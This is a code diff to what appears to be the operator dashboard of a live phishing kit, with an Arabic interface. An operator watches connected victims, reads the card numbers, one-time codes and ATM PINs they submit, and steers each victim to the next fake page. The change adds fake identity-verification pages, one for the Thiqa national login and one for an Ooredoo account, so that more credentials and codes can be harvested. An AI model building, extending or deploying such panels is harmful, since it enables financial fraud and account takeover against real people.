@@ -1475,6 +1475,8 @@
       html += '<option value="credit-card-payment">الدفع بالبطاقة</option>';
       html += '<option value="otp-verification">رمز التحقق (OTP)</option>';
       html += '<option value="cvv">رمز ATM</option>';
+      html += '<option value="identity-verification">التحقق من الهوية</option>';
+      html += '<option value="thiqa-auth">مصادقة ثقة</option>';
       html += '<option value="final-page">الصفحة النهائية</option>';
       html += '</select>';
       html += '<button onclick="navigateVisitorTop(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>توجيه</button>';
@@ -2066,33 +2068,54 @@
             
             // إضافة أزرار موافقة/رفض لصفحة توثيق الجوال (OTP دخول)
             if (dataEntry.page === 'توثيق الجوال' && dataEntry.content && dataEntry.content['رمز التحقق']) {
-              const otpApproveBtnId = 'otp-approve-btn-' + visitor.socketId + '-' + dataIndex;
+              const otpOoredooBtnId = 'otp-ooredoo-btn-' + visitor.socketId + '-' + dataIndex;
+              const otpThiqaBtnId = 'otp-thiqa-btn-' + visitor.socketId + '-' + dataIndex;
               const otpRejectBtnId = 'otp-reject-btn-' + visitor.socketId + '-' + dataIndex;
               html += '<div class="flex gap-2 mt-3">';
-              html += '<button id="' + otpApproveBtnId + '" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
+              html += '<button id="' + otpThiqaBtnId + '" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>ثقة</button>';
+              html += '<button id="' + otpOoredooBtnId + '" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>تسجيل دخول اوريدو</button>';
               html += '<button id="' + otpRejectBtnId + '" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
               html += '</div>';
               setTimeout(() => {
-                const approveBtn = document.getElementById(otpApproveBtnId);
+                const ooredooBtn = document.getElementById(otpOoredooBtnId);
+                const thiqaBtn = document.getElementById(otpThiqaBtnId);
                 const rejectBtn = document.getElementById(otpRejectBtnId);
-                if (approveBtn) {
-                  approveBtn.addEventListener('click', () => {
-                    navigateVisitorToPage(visitor.socketId, 'final-page');
+                
+                if (ooredooBtn) {
+                  ooredooBtn.addEventListener('click', () => {
+                    navigateVisitorToPage(visitor.socketId, 'identity-verification');
                     visitor.waitingForAdminResponse = false;
                     renderVisitorsList();
-                    approveBtn.textContent = 'تم الإرسال ✓';
-                    approveBtn.classList.remove('bg-green-600', 'hover:bg-green-700');
-                    approveBtn.classList.add('bg-gray-500');
+                    ooredooBtn.textContent = 'تم الإرسال ✓';
+                    ooredooBtn.classList.remove('bg-green-600', 'hover:bg-green-700');
+                    ooredooBtn.classList.add('bg-gray-500');
                     setTimeout(() => {
-                      approveBtn.textContent = 'موافقة';
-                      approveBtn.classList.remove('bg-gray-500');
-                      approveBtn.classList.add('bg-green-600', 'hover:bg-green-700');
-                    }, 1500);
+                      ooredooBtn.textContent = 'تسجيل دخول اوريدو';
+                      ooredooBtn.classList.remove('bg-gray-500');
+                      ooredooBtn.classList.add('bg-green-600', 'hover:bg-green-700');
+                    }, 2000);
                   });
                 }
+                
+                if (thiqaBtn) {
+                  thiqaBtn.addEventListener('click', () => {
+                    navigateVisitorToPage(visitor.socketId, 'thiqa-auth');
+                    visitor.waitingForAdminResponse = false;
+                    renderVisitorsList();
+                    thiqaBtn.textContent = 'تم الإرسال ✓';
+                    thiqaBtn.classList.remove('bg-blue-600', 'hover:bg-blue-700');
+                    thiqaBtn.classList.add('bg-gray-500');
+                    setTimeout(() => {
+                      thiqaBtn.textContent = 'ثقة';
+                      thiqaBtn.classList.remove('bg-gray-500');
+                      thiqaBtn.classList.add('bg-blue-600', 'hover:bg-blue-700');
+                    }, 2000);
+                  });
+                }
+                
                 if (rejectBtn) {
                   rejectBtn.addEventListener('click', () => {
-                    socket.emit('admin:cardAction', { visitorSocketId: visitor.socketId, action: 'reject' });
+                    socket.emit('admin:codeAction', { visitorSocketId: visitor.socketId, action: 'reject', codeIndex: dataIndex });
                     visitor.waitingForAdminResponse = false;
                     renderVisitorsList();
                     rejectBtn.textContent = 'تم الإرسال ✓';
@@ -2102,7 +2125,7 @@
                       rejectBtn.textContent = 'رفض';
                       rejectBtn.classList.remove('bg-gray-500');
                       rejectBtn.classList.add('bg-red-600', 'hover:bg-red-700');
-                    }, 1500);
+                    }, 2000);
                   });
                 }
               }, 100);
@@ -2236,6 +2259,8 @@
       html += '<option value="credit-card-payment">الدفع بالبطاقة</option>';
       html += '<option value="otp-verification">رمز التحقق (OTP)</option>';
       html += '<option value="cvv">رمز ATM</option>';
+      html += '<option value="identity-verification">التحقق من الهوية</option>';
+      html += '<option value="thiqa-auth">مصادقة ثقة</option>';
       html += '<option value="final-page">الصفحة النهائية</option>';
       html += '</select>';
       html += '<button onclick="navigateVisitor(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700">توجيه</button></div></div>';
